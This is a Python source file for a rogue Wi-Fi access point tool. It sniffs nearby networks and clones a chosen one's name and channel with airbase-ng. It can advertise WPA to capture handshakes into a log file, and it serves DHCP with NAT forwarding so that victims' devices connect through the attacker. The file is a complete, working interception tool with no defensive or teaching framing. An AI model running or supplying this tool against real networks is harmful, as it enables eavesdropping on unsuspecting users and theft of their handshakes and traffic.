#!/usr/bin/env python

import os
from subprocess import Popen, PIPE
import time
import sys
import re
import signal
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb = 0
from threading import Thread, Lock
import socket
import struct
import fcntl

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

lock = Lock()
DN = open(os.devnull, 'w')
APs = {} # for listing APs
chan = 0 # for channel hopping Thread
count = 0 # for channel hopping Thread
forw = '0\n' # for resetting ip forwarding to original state
ap_mac = '' # for sniff's cb function
err = None # check if channel hopping is working

def parse_args():
    #Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--channel", help="Choose the channel for the fake AP. Default is channel 6")
    parser.add_argument("-w", "--wpa", help="Start the fake AP with WPA beacon tags and capture handshakes in fakeAPlog.cap file", action="store_true")
    parser.add_argument("-e", "--essid", help="Choose the ESSID for the fake AP. Default is 'Free Wifi'. Wrap in quotes if it is more than 1 word: -e 'Free Wifi'")
    parser.add_argument("-t", "--targeting", help="Will print a list of APs in range and allow you to copy their settings except for the encryption which by default will be open", action="store_true")
    return parser.parse_args()


###############
# AP TARGETING
###############

def channel_hop(mon_iface):
    global chan, err
    while 1:
        try:
            err = None
            if chan > 11:
                chan = 0
            chan = chan+1
            channel = str(chan)
            iw = Popen(['iw', 'dev', mon_iface, 'set', 'channel', channel], stdout=DN, stderr=PIPE)
            for line in iw.communicate()[1].split('\n'):
                if len(line) > 2: # iw dev shouldnt display output unless there's an error
                    with lock:
                        err = '['+R+'-'+W+'] Channel hopping failed: '+R+line+W+'\n    \
Try disconnecting the monitor mode\'s parent interface (e.g. wlan0)\n    \
from the network if you have not already\n'
                    break
            time.sleep(1)
        except KeyboardInterrupt:
            sys.exit()

def target_APs():
    os.system('clear')
    if err:
        print err
    print '['+G+'+'+W+'] Ctrl-C at any time to copy an access point from below'
    print 'num  ch   ESSID'
    print '---------------'
    for ap in APs:
        print G+str(ap).ljust(2)+W+' - '+APs[ap][0].ljust(2)+' - '+T+APs[ap][1]+W

def copy_AP():
    copy = None
    while not copy:
        try:
            copy = raw_input('\n['+G+'+'+W+'] Choose the ['+G+'num'+W+'] of the AP you wish to copy: ')
            copy = int(copy)
        except Exception:
            copy = None
            continue
    channel = APs[copy][0]
    essid = APs[copy][1]
    if str(essid) == "\x00":
        essid = ' '
    mac = APs[copy][2]
    return channel, essid, mac

def targeting_cb(pkt):
    global APs, count
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        try:
            ap_channel = str(ord(pkt[Dot11Elt:3].info))
        except Exception:
            return
        essid = pkt[Dot11Elt].info
        mac = pkt[Dot11].addr2
        if len(APs) > 0:
            for num in APs:
                if essid in APs[num][1]:
                    return
        count += 1
        APs[count] = [ap_channel, essid, mac]
        target_APs()

###################
# END AP TARGETING
###################
def get_isc_dhcp_server():
    if not os.path.isfile('/usr/sbin/dhcpd'):
        install = raw_input('['+T+'*'+W+'] isc-dhcp-server not found in /usr/sbin/dhcpd, install now? [y/n] ')
        if install == 'y':
            os.system('apt-get -y install isc-dhcp-server')
        else:
            sys.exit('['+R+'-'+W+'] isc-dhcp-server not found in /usr/sbin/dhcpd')

def iwconfig():
    monitors = []
    interfaces = {}
    proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue # Isn't an empty string
        if line[0] != ' ': # Doesn't start with space
            #ignore_iface = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]|at[0-9]', line)
            #if not ignore_iface: # Isn't wired or at0 tunnel
            iface = line[:line.find(' ')] # is the interface name
            if 'Mode:Monitor' in line:
                monitors.append(iface)
            elif 'IEEE 802.11' in line:
                if "ESSID:\"" in line:
                    interfaces[iface] = 1
                else:
                    interfaces[iface] = 0
    return monitors, interfaces

def rm_mon():
    monitors, interfaces = iwconfig()
    for m in monitors:
        if 'mon' in m:
            Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
        else:
            Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
            Popen(['iw', 'dev', m, 'mode', 'managed'], stdout=DN, stderr=DN)
            Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)

def internet_info(interfaces):
    '''return the internet connected iface'''
    inet_iface = None
    proc = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
    def_route = proc.communicate()[0].split('\n')#[0].split()
    for line in def_route:
        if 'default via' in line:
            line = line.split()
            inet_iface = line[4]
            ipprefix = line[2][:2] # Just checking if it's 192, 172, or 10
    if inet_iface:
        return inet_iface, ipprefix
    else:
        #cont = False
        #while not cont:
        #    cont = raw_input('['+R+'-'+W+'] No active internet connection found. AP will be without internet. Hit [c] to continue: ')
        sys.exit('['+R+'-'+W+'] No active internet connection found. Exiting')

def AP_iface(interfaces, inet_iface, exception="_wifi"):
    for i in interfaces:
        if i != inet_iface and i != exception:
            return i

    print "["+T+"*"+W+"] Cannot find a third interface for the AP. We'll use " + exception
    return exception

def iptables(inet_iface):
    global forw
    os.system('iptables -X')
    os.system('iptables -F')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('iptables -t nat -A POSTROUTING -o %s -j MASQUERADE' % inet_iface)
    with open('/proc/sys/net/ipv4/ip_forward', 'r+') as ipf:
        forw = ipf.read()
        ipf.write('1\n')
        return forw

def start_monitor(ap_iface, channel):
    proc = Popen(['airmon-ng', 'start', ap_iface, channel], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if "monitor mode enabled" in line:
            line = line.split()
            mon_iface = line[4][:-1]
            return mon_iface

def get_mon_mac(mon_iface):
    '''http://stackoverflow.com/questions/159137/getting-mac-address'''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    return mac

def start_ap(mon_iface, channel, essid, args):
    print '['+T+'*'+W+'] Starting the fake access point...'
    if args.wpa:
        Popen(['airbase-ng', '-P', '-Z', '4', '-W', '1', '-c', channel, '-e', essid, '-v', mon_iface, '-F', 'fakeAPlog'], stdout=DN, stderr=DN)
    else:
        Popen(['airbase-ng', '-c', channel, '-e', essid, '-v', mon_iface], stdout=DN, stderr=DN)
    try:
        time.sleep(6) # Copied from Pwnstar which said it was necessary?
    except KeyboardInterrupt:
        cleanup(None, None)
    Popen(['ifconfig', 'at0', 'up', '10.0.0.1', 'netmask', '255.255.255.0'], stdout=DN, stderr=DN)
    Popen(['ifconfig', 'at0', 'mtu', '1400'], stdout=DN, stderr=DN)

def sniffing(interface, cb):
    '''This exists for if/when I get deauth working
    so that it's easy to call sniff() in a thread'''
    sniff(iface=interface, prn=cb, store=0)

def dhcp_conf(ipprefix):
    config = ('default-lease-time 300;\n'
              'max-lease-time 360;\n'
              'ddns-update-style none;\n'
              'authoritative;\n'
              'log-facility local7;\n'
              'subnet %s netmask 255.255.255.0 {\n'
              'range %s;\n'
              'option routers %s;\n'
              'option domain-name-servers %s;\n'
              '}')
    if ipprefix == '19' or ipprefix == '17':
        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
            # subnet, range, router, dns
            dhcpconf.write(config % ('10.0.0.0', '10.0.0.2 10.0.0.100', '10.0.0.1', '8.8.8.8'))
    elif ipprefix == '10':
        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
            dhcpconf.write(config % ('172.16.0.0', '172.16.0.2 172.16.0.100', '172.16.0.1', '8.8.8.8'))
    return '/tmp/dhcpd.conf'

def dhcp(dhcpconf, ipprefix):
    os.system('echo > /var/lib/dhcp/dhcpd.leases')
    dhcp = Popen(['dhcpd', '-cf', dhcpconf], stdout=PIPE, stderr=DN)
    if ipprefix == '19' or ipprefix == '17':
        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
    else:
        os.system('route add -net 172.16.0.0 netmask 255.255.255.0 gw 172.16.0.1')

def mon_mac(mon_iface):
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    return mac

def cleanup(signal, frame):
    with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
        forward.write(forw)
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('pkill airbase-ng')
    os.system('pkill dhcpd') # Dangerous?
    rm_mon()
    sys.exit('\n['+G+'+'+W+'] Cleaned up')

def main(args):
    global ipf, mon_iface, ap_mac

    if os.geteuid() != 0:
        sys.exit('['+R+'-'+W+'] Run as root')

    get_isc_dhcp_server()

    channel = '1'
    if args.channel:
        channel = args.channel
    essid = 'Free Wifi'
    if args.essid:
        essid = args.essid

    monitors, interfaces = iwconfig()
    rm_mon()
    inet_iface, ipprefix = internet_info(interfaces)
    ap_iface = AP_iface(interfaces, inet_iface)
    if not ap_iface:
        sys.exit('['+R+'-'+W+'] Found internet connected interface in '+T+inet_iface+W+'. Please bring up a wireless interface to use as the fake access point.')
    ipf = iptables(inet_iface)
    print '['+T+'*'+W+'] Cleared leases, started DHCP, set up iptables'
    mon_iface = start_monitor(ap_iface, channel)
    mon_mac1 = get_mon_mac(mon_iface)
    if args.targeting:
        hop = Thread(target=channel_hop, args=(mon_iface,))
        hop.daemon = True
        hop.start()
        sniffing(mon_iface, targeting_cb)
        channel, essid, ap_mac = copy_AP()
    start_ap(mon_iface, channel, essid, args)
    dhcpconf = dhcp_conf(ipprefix)
    dhcp(dhcpconf, ipprefix)
    while 1:
        signal.signal(signal.SIGINT, cleanup)
        os.system('clear')
        print '['+T+'*'+W+'] '+T+essid+W+' set up on channel '+T+channel+W+' via '+T+mon_iface+W+' on '+T+ap_iface+W
        print '\nDHCP leases log file:'
        proc = Popen(['cat', '/var/lib/dhcp/dhcpd.leases'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            print line
        time.sleep(1)

#main(parse_args())
